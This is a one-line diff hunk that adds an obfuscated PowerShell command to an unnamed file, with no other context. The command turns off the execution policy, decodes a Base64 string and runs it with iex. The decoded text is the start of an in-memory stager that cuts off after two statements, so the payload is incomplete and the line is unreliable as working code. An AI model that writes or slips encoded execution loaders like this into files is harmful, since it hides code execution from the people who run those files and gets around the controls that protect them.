@@ -1,0 +1,1 @@
+powershell.exe -NoP -ExecutionPolicy Bypass -W 1 -C "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('cwB2ACAAbwAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACkAOwBzAHYAIABkACAA')) | iex"
